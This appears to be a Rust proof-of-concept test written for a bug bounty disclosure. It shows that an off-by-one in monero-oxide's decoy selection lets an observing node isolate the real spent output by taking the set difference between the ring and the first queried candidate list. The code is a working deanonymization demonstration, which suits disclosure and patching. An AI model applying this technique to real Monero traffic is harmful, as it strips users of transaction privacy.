// PoC for monero-oxide decoy-selection off-by-one (Immunefi #54470).
//
// Drop this module into `monero-oxide/monero-oxide/wallet/src/decoys.rs` (behind cfg(test))
// and run with `cargo test poc_deanonymize_via_first_candidates_set_difference`.
//
// It stands up a mock DecoyRpc that records the FIRST candidate list passed to
// get_unlocked_outputs, runs the real select_n, and then shows that
// (ring_indices \ first_candidates) uniquely isolates the real output — the exact
// set-difference a malicious/observing node performs to fingerprint the true spend.

#[cfg(test)]
mod poc_end_to_end {
    use super::*;
    use core::cell::RefCell;
    use async_trait::async_trait;
    use curve25519_dalek::{constants::ED25519_BASEPOINT_TABLE, Scalar, EdwardsPoint};
    use rand_chacha::ChaCha20Rng;
    use rand_core::{SeedableRng, RngCore, CryptoRng};

    struct MockRpc {
        first_candidates: RefCell<Option<Vec<u64>>>,
        distribution: Vec<u64>,
        end_height: usize,
    }

    #[async_trait]
    impl crate::rpc::DecoyRpc for MockRpc {
        async fn get_output_distribution(
            &self,
            range: core::ops::RangeTo<usize>,
        ) -> Result<Vec<u64>, RpcError> {
            let end = range.end.min(self.distribution.len());
            Ok(self.distribution[..end].to_vec())
        }

        async fn get_output_distribution_end_height(&self) -> Result<usize, RpcError> {
            Ok(self.end_height)
        }

        async fn get_unlocked_outputs(
            &self,
            candidates: &[u64],
            _height: usize,
            _fingerprintable_deterministic: bool,
        ) -> Result<Vec<Option<[EdwardsPoint; 2]>>, RpcError> {
            // Record only the FIRST batch — this is what an observing node logs.
            let mut slot = self.first_candidates.borrow_mut();
            if slot.is_none() {
                *slot = Some(candidates.to_vec());
            }
            let p = &ED25519_BASEPOINT_TABLE * &Scalar::ONE;
            Ok(candidates.iter().map(|_| Some([p, p])).collect())
        }
    }

    fn make_distribution(len: usize, per_block: u64) -> Vec<u64> {
        let mut v = Vec::with_capacity(len);
        let mut acc = 0u64;
        for _ in 0..len {
            v.push(acc);
            acc = acc.saturating_add(per_block);
        }
        v
    }

    #[tokio::test]
    async fn poc_deanonymize_via_first_candidates_set_difference() {
        let ring_len: u8 = 16;
        let height: usize = 200_000;
        let real_output: u64 = 123_456;

        let distribution_len = height + 20_000;
        let distribution = make_distribution(distribution_len, 10);

        let rpc = MockRpc {
            first_candidates: RefCell::new(None),
            distribution,
            end_height: distribution_len,
        };

        let mut rng = ChaCha20Rng::seed_from_u64(7);

        let decoys = super::select_n(
            &mut rng,
            &rpc,
            height,
            real_output,
            ring_len,
            false,
        )
        .await
        .expect("select_n failed");

        let first_candidates = rpc
            .first_candidates
            .borrow()
            .clone()
            .expect("MockRpc never saw a candidates list");

        let mut ring_indices: Vec<u64> = decoys.iter().map(|(idx, _)| *idx).collect();
        ring_indices.push(real_output);
        ring_indices.sort_unstable();
        ring_indices.dedup();

        // The attack: what is in the on-chain ring but was NEVER queried in the first batch?
        let diff: Vec<u64> = ring_indices
            .iter()
            .copied()
            .filter(|i| !first_candidates.contains(i))
            .collect();

        assert_eq!(
            diff,
            vec![real_output],
            "BUG NOT REPRODUCED: ring \\ first_candidates didn't isolate the real output"
        );

        eprintln!("first_candidates.len() = {}", first_candidates.len());
        eprintln!("ring_indices.len()     = {}", ring_indices.len());
        eprintln!("real_output            = {}", real_output);
        eprintln!("difference             = {:?}", diff);
    }
}
